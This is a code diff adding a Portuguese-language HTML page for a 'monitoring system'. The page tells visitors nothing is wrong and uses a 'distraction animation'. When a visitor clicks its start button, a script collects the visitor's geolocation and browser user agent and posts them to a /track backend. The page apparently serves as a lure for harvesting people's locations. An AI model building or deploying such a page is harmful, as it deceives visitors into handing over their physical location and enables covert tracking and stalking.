@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bem-vindo ao Sistema de Monitoramento</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
+</head>
+<body>
+    <div class="container">
+        <h1>Bem-vindo ao Sistema de Monitoramento</h1>
+        <p>Você está prestes a explorar um sistema inteligente de monitoramento. Não se preocupe, nada de errado por aqui!</p>
+        <button class="button">Iniciar Exploração</button>
+
+        <!-- Animação de distração -->
+        <div class="animation-container"></div>
+    </div>
+
+    <script>
+        // Função para enviar os dados ao backend
+        function sendDataToBackend(latitude, longitude, userAgent) {
+            fetch('/track', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    latitude: latitude,
+                    longitude: longitude,
+                    userAgent: userAgent
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Dados enviados com sucesso:', data);
+            })
+            .catch((error) => {
+                console.error('Erro ao enviar dados:', error);
+            });
+        }
+
+        // Simula a interação do botão (não redireciona para outras páginas, apenas simula a ação)
+        document.querySelector('.button').addEventListener('click', function() {
+            alert('Exploração iniciada! Os dados estão sendo monitorados.');
+            
+            // Obter a localização do usuário
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const userAgent = navigator.userAgent;
+
+                    console.log(`Latitude: ${latitude}, Longitude: ${longitude}, User Agent: ${userAgent}`);
+                    
+                    // Enviar os dados para o backend
+                    sendDataToBackend(latitude, longitude, userAgent);
+                });
+            } else {
+                alert("Geolocalização não suportada pelo seu navegador.");
+            }
+        });
+    </script>
+</body>
+</html>
